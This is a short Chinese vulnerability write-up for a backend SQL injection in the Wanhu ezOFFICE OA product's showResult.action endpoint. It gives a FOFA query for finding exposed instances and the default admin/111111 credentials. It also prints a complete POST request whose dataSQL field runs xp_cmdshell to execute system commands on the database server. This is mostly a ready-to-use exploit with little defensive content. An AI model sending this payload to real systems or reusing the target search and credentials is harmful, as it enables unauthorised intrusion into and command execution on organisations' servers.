# 万户OA showResult.action 后台SQL注入漏洞

## 漏洞描述

万户OA showResult.action 存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息

## 漏洞影响

```
万户OA
```

## FOFA

```
app="万户网络-ezOFFICE"
```

## 漏洞复现

产品页面

![image-20220520132902980](./images/202205201329080.png)

默认账号密码：admin/111111

发送请求包：

```
POST /defaultroot/Graph!showResult.action HTTP/1.1 
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded 
Content-Length: 69 
Connection: close
Cookie: OASESSIONID=5AC1D44965A277C90D94B57DEDA82992; LocLan=zh_CN; JSESSIONID=5AC1D44965A277C90D94B57DEDA82992; OASESSIONID=5AC1D44965A277C90D94B57DEDA82992; ezofficeDomainAccount=whir; empLivingPhoto=; ezofficeUserName=dsfssaq; ezofficeUserPortal=; ezofficePortal135=1 
Upgrade-Insecure-Requests: 1

database=localDataSource&dataSQL=exec+master..xp_cmdshell+"ipconfig";
```

![image-20220520132915993](./images/202205201329050.png)